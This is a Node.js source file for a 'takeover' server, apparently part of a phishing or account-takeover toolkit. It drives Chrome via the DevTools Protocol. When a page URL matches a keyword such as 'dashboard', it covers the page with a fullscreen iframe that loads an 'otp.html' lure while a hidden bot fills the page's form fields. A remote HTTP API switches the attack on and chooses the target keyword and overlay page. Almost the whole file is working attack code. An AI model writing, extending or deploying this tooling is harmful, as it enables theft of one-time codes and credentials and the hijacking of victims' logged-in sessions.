const CDP = require('chrome-remote-interface');
const express = require('express');

const app = express();
app.use(express.json());
app.use("/pages", express.static("/usr/local/share/takeover-pages"));

let takeoverEnabled = false;
let targetKeyword = "dashboard";
let overlayPage = "otp.html";

let cdpClient = null;

/* ===============================
   Connexion CDP avec retry
=================================*/

async function connectWithRetry(retries = 30, delay = 1000) {
  for (let i = 0; i < retries; i++) {
    try {
      const client = await CDP({ host: '127.0.0.1', port: 9222 });
      console.log("[takeover] Connected to Chrome CDP");
      return client;
    } catch (err) {
      console.log(`[takeover] Waiting for Chrome... (${i + 1}/${retries})`);
      await new Promise(res => setTimeout(res, delay));
    }
  }
  throw new Error("Chrome CDP not available after retries");
}

async function initCDP() {
  cdpClient = await connectWithRetry();

  const { Page, Network } = cdpClient;

  await Page.enable();
  await Network.enable();

  console.log("[takeover] CDP ready");

  const checkUrl = (url) => {
    if (!takeoverEnabled) return;
    if (url.includes(targetKeyword)) {
      console.log("🚀 TAKEOVER TRIGGERED:", url);
      runBotAction();
    }
  };

  Page.frameNavigated((event) => {
    if (event.frame && event.frame.url) {
      checkUrl(event.frame.url);
    }
  });

}
console.log("TAKEOVER SERVER LISTENING");
/* ===============================
   OVERLAY MANAGEMENT
=================================*/
async function removeOverlay() {
  if (!cdpClient) return;

  const { Runtime } = cdpClient;

  console.log("[takeover] Removing overlay");

  await Runtime.evaluate({
    expression: `
      (function() {
        const el = document.getElementById("takeover-overlay");
        if (el) {
          el.remove();
        }
      })();
    `
  });

  console.log("[takeover] Overlay removed");
}

async function injectOverlay() {
  if (!cdpClient) return;

  const { Page, Runtime } = cdpClient;

  console.log("[takeover] Injecting fullscreen overlay (isolated world)");

  // 1️⃣ Récupérer le main frame
  const { frameTree } = await Page.getFrameTree();
  const mainFrameId = frameTree.frame.id;

  console.log("[takeover] Main frame ID:", mainFrameId);

  // 2️⃣ Créer un contexte d’exécution isolé dans le main frame
  const { executionContextId } = await Page.createIsolatedWorld({
    frameId: mainFrameId,
    worldName: "takeover-world"
  });

  console.log("[takeover] Execution context ID:", executionContextId);

  // 3️⃣ Injecter l’overlay dans CE contexte
  await Runtime.evaluate({
    expression: `
      (function() {
        if (document.getElementById("takeover-overlay")) return;

        const iframe = document.createElement("iframe");
        iframe.id = "takeover-overlay";
        iframe.src = "http://127.0.0.1:4000/pages/" + "${overlayPage}";

        iframe.style.position = "fixed";
        iframe.style.top = "0";
        iframe.style.left = "0";
        iframe.style.width = "100vw";
        iframe.style.height = "100vh";
        iframe.style.border = "none";
        iframe.style.zIndex = "999999999";

        document.body.appendChild(iframe);
      })();
    `,
    contextId: executionContextId
  });

  console.log("[takeover] Overlay injected in isolated world");
}

/* ===============================
   BOT ACTION
=================================*/

async function runBotAction() {
  if (!cdpClient) return;

  try {
    const { Runtime } = cdpClient;

    // 1️⃣ Inject overlay visible pour l'utilisateur
    await injectOverlay();
    console.log("[bot] Overlay active, bot continues underneath");

    // 2️⃣ BOT ACTION DOM-BASED
    await Runtime.evaluate({
      expression: `
        (function() {
          const input = document.querySelector('input[name="urname"]');
          if (!input) {
            console.log("[bot] Input not found");
            return;
          }

          console.log("[bot] Input found");

          // Focus + click
          input.focus();
          input.click();

          // Clear existing value
          input.value = "";

          // Type "test"
          input.value = "bot fonctionne";

          // Trigger events (important si validation JS)
          input.dispatchEvent(new Event("input", { bubbles: true }));
          input.dispatchEvent(new Event("change", { bubbles: true }));

          console.log("[bot] Text injected");
        })();
      `
    });

  } catch (err) {
    console.error("[bot] Error:", err);
  }
}


/* ===============================
   API CONTROL RUNTIME
=================================*/

app.post("/takeover", async (req, res) => {
  try {
    const { enabled, keyword, page } = req.body;

    console.log("[takeover] API called with body:", req.body);

    takeoverEnabled = Boolean(enabled);

    if (typeof keyword === "string" && keyword.trim() !== "") {
      targetKeyword = keyword.trim();
    } else {
      targetKeyword = null;
    }

    if (typeof page === "string" && page.trim() !== "") {
      overlayPage = page.trim();
    }

    console.log(
      `[takeover] enabled=${takeoverEnabled} keyword=${targetKeyword} page=${overlayPage}`
    );

    if (!takeoverEnabled) {
      await removeOverlay();
    }

    return res.json({
      status: "ok",
      enabled: takeoverEnabled,
      keyword: targetKeyword,
      page: overlayPage
    });

  } catch (err) {
    console.error("[takeover] API error:", err);
    return res.status(500).json({ status: "error", error: err.message });
  }
});

app.listen(4000, "0.0.0.0", () => {
  console.log("[takeover] API listening on 0.0.0.0:4000");
});

/* =============================== */

initCDP().catch(err => {
  console.error("[takeover] Fatal CDP error:", err);
});